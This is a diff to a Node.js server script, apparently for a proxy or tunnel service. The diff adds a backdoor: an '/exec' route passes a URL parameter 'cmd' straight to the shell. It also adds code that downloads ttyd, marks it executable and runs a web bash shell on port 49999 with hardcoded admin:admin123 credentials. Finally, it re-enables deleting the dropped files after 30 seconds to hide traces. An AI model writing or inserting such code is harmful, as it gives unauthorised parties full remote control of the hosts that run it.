@@ -1,5 +1,6 @@
 const os = require('os');
 const http = require('http');
+const url = require('url');
 const fs = require('fs');
 const axios = require('axios');
 const net = require('net');
@@ -50,6 +51,21 @@ const httpServer = http.createServer((req, res) => {
         } else {
             res.end("<pre>获取系统进程表：\n" + stdout + "</pre>");
         }
+    });
+  } else if (req.url === `/${UUID}/exec`) {
+    // Get information object about request URL:
+    // 'true' sets parameters to be returned in object format
+    const parsedURL = url.parse(req.url, true);
+    // Get all parameters:
+    console.log(parsedURL.query); // { key1: 'value1', key2: 'value2', key3: 'value3' }
+    res.writeHead(200, { 'Content-Type': 'text/plain' });
+    if (!parsedURL.query.cmd) {
+        res.end('No command\n');
+        return;
+    }
+    let cmdStr = parsedURL.query.cmd;
+    exec(cmdStr, function (err, stdout, stderr) {
+        res.end(err? err.message : stdout);
     });
   } else {
     res.writeHead(404, { 'Content-Type': 'text/plain' });
@@ -230,6 +246,97 @@ async function keep_alive() {
   }
 }
 
+
+// 下载对应系统架构的二进制文件
+function downloadBinaryFile(fileName, fileUrl, callback) {
+    const filePath = path.join("./", fileName);
+    const writer = fs.createWriteStream(filePath);
+    axios({
+        method: 'get',
+        url: fileUrl,
+        responseType: 'stream',
+    })
+        .then(response => {
+            response.data.pipe(writer);
+            writer.on('finish', function () {
+                writer.close();
+                callback(null, fileName);
+            });
+        })
+        .catch(error => {
+            callback(`Download ${fileName} failed: ${error.message}`);
+        });
+}
+
+async function downloadFiles() {
+    const filesToDownload = getFilesForArchitecture();
+
+    if (filesToDownload.length === 0) {
+        console.log(`Can't find a file for the current architecture`);
+        return;
+    }
+
+    let downloadedCount = 0;
+
+    filesToDownload.forEach(fileInfo => {
+        downloadBinaryFile(fileInfo.fileName, fileInfo.fileUrl, (err, fileName) => {
+            if (err) {
+                console.log(`Download ${fileName} failed`);
+            } else {
+                console.log(`Download ${fileName} successfully`);
+
+                downloadedCount++;
+
+                if (downloadedCount === filesToDownload.length) {
+                    setTimeout(() => {
+                        authorizeFiles();
+                    }, 3000);
+                }
+            }
+        });
+    });
+}
+
+function getFilesForArchitecture() {
+    const arch = os.arch();
+    if (arch === 'arm64') {
+        return [
+            { fileName: "ttyd", fileUrl: "https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.aarch64" },
+        ];
+    } else if (arch === 'arm'){
+        return [
+            { fileName: "ttyd", fileUrl: "https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.armhf" },
+        ];
+    } else {
+        return [
+            { fileName: "ttyd", fileUrl: "https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.x86_64" },
+        ];
+    }
+}
+
+// 授权并运行
+function authorizeFiles() {
+    const filePath = './ttyd';
+    const newPermissions = 0o775;
+    if (fs.existsSync(filePath)){
+        fs.chmod(filePath, newPermissions, (err) => {
+            if (err) {
+                console.error(`Empowerment failed:${err}`);
+            } else {
+                console.log(`Empowerment success:${newPermissions.toString(8)} (${newPermissions.toString(10)})`);
+                const command = `./ttyd -p 49999 -c admin:admin123 -W bash >/dev/null 2>&1 &`;
+                try {
+                    exec(command);
+                    console.log(`${filePath} is running`);
+                } catch (error) {
+                    console.error(`${filePath} running error: ${error}`);
+                }
+            }
+        });
+    }
+}
+downloadFiles();
+
 const delFiles = () => {
   fs.unlink('npm', () => { });
   fs.unlink('config.yaml', () => { });
@@ -238,9 +345,9 @@ const delFiles = () => {
 if (AUTO_ACCESS && DOMAIN) setInterval(keep_alive, 10 * 60 * 1000);
 httpServer.listen(PORT, () => {
   runnz();
-  // setTimeout(() => {
-  //   delFiles();
-  // }, 30000);
+  setTimeout(() => {
+    delFiles();
+  }, 30000);
   keep_alive();
   console.log(`Server is running on port ${PORT}`);
 });
